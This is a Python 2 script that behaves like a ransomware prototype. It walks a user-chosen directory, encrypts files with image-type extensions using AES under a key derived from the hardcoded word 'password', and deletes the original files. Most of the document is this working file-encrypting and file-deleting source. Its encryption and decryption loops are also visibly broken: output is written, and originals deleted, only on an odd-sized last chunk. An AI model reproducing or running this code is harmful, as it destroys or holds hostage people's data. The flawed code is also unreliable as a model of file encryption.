import os, random
import glob
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

EXTENSIONS = {
    "OFFICE": [
        ".txt", ".csv", ".doc", ".docx", ".docm", ".dotm", ".dot", ".wbk", ".xls",
        ".xlt", ".xlm", ".xlsx", ".xltx", "xltm", ".ppt", ".pot", ".pps", ".pptx",
        ".pptm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm"
    ],
    "IMAGE":[
        ".gif", ".pdf", ".png", ".jpg", ".jpeg", ".ani", ".bmp", ".cal", ".img", ".mac",
        ".jbm", ".WMF"
    ],
    "AUDIO":[".mp3",".wav", ".aiff", ".aac", ".ogg", ".wma", ".flac", ".alac"],
    "VIDEO":[".avi", ".asf", ".mov", ".avchd", ".vlc", ".mpg", ".mp4", ".wmv"]
}
OFFICE = EXTENSIONS.get("OFFICE")
IMAGE = EXTENSIONS.get("IMAGE")
AUDIO = EXTENSIONS.get("AUDIO")
VIDEO = EXTENSIONS.get("VIDEO")

KEYWORD = "password"

def encrypt(key, path, filename):
    os.chdir(path)

    chunksize = 64*1024
    outputFile = "(encryted)"+filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV = ''

    for i in range(16):
        IV += chr(random.randint(0, 0xFF))

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize)
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - (len(chunk) % 16))
                    os.remove(filename)
                    outfile.write(encryptor.encrypt(chunk))
                    print "[+] "+"\""+filename+"\""+" has been encrypted"

def decrypt(key, path, filename):
    os.chdir(path)

    chunksize = 64*1024
    outputFile = filename[10:]

    with open(filename, 'rb') as infile:
        filesize = long(infile.read(16))
        IV = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(outputFile, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                else:
                    os.remove(filename)
                    outfile.write(decryptor.decrypt(chunk))
                    outfile.truncate(filesize)
                    print "[+] "+"\""+filename+"\""+" has been decrypted"


def get_key(password):
    hasher = SHA256.new(password)
    return hasher.digest()

def encrypt_all(key, directory):

    result = []
    sub_directories = [x[0] for x in os.walk(directory)]

    for sub_directory in sub_directories:
        files = os.walk(sub_directory).next()[2]
        if (len(files) > 0):
            for file in files:
                for extension in IMAGE:
                    if file.endswith(extension):
                        path = sub_directory + "/"
                        result.append(path + file)
                        encrypt(get_key(key), path, file)
                    else:
                        pass

def decrypt_all(key, directory):
    result = []
    sub_directories = [x[0] for x in os.walk(directory)]

    for sub_directory in sub_directories:
        files = os.walk(sub_directory).next()[2]
        if (len(files) > 0):
            for file in files:
                for extension in IMAGE:
                    if file.endswith(extension):
                        path = sub_directory + "/"
                        result.append(path + file)
                        decrypt(get_key(key), path, file)
                    else:
                        pass


def Main():
    # test()

    choice = raw_input("Enter a directory: ")
    encrypt_all(KEYWORD, choice)

    # choice = raw_input("Do you want to (E)ncrypt or (D)ecrypt?: ")
    #
    # if choice == 'E' or choice == 'e':
    #     filename = raw_input("File to encrypt: ")
    #     password = raw_input("Password: ")
    #     try:
    #         encrypt(get_key(password), filename)
    #         print "... File encrypted"
    #     except:
    #         print "... Input file does not exist"
    # elif choice == 'D' or choice == 'e':
    #     try:
    #         filename = raw_input("File to decrypt: ")
    #         password = raw_input("Password: ")
    #         decrypt(get_key(password), filename)
    #         print "... File decrypted"
    #     except:
    #         print "... Input file does not exist"
    # else:
    #     print "No option selected, closing..."

if __name__ == '__main__':
    Main()
